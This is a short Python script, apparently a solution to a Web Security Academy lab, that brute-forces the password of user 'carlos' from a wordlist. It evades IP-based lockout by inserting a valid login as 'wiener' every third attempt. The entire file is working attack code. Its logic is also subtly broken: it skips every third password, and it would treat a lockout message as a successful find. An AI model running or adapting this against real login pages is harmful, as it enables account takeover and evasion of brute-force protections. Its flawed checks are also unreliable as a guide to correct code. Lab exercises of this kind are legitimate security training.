import requests


target = "https://ac951fa21e264459c0a0464000e200ba.web-security-academy.net/login"
session_id = "W4EACdQfTzH1lnbEjVGzM6jegCdRGpqz"
session_cookie = {'session': 'W4EACdQfTzH1lnbEjVGzM6jegCdRGpqz'}
valid_data = {'username': 'wiener', 'password': 'peter'}
known_user = 'carlos'

user_list = open('/opt/wordlists/usernames.txt', 'r')
users = [l.strip('\n') for l in user_list]
pass_list = open('/opt/wordlists/passwords.txt', 'r')
passwords = [i.strip('\n') for i in pass_list]




def bruteforce():
    attempts = 0
    found_pass = ''
    data = valid_data
    response = requests.post(target, cookies=session_cookie, data=data)
    for p in passwords:
        attempts += 1
        if attempts % 3 != 0:
            data = {'username': known_user, 'password': p}
            response = requests.post(target, cookies=session_cookie, data=data)
            if 'Incorrect' not in response.text:
                found_pass = p
                print(f'FOUND PASSWORD: {p}')
                break
            elif 'You have made too many incorrect' in response.text:
                print('BROKEN' * 10)
        else:
            data = valid_data
            response = requests.post(target, cookies=session_cookie, data=data)


    print(f'USERNAME: {known_user}, PASSWORD: {found_pass}')


bruteforce()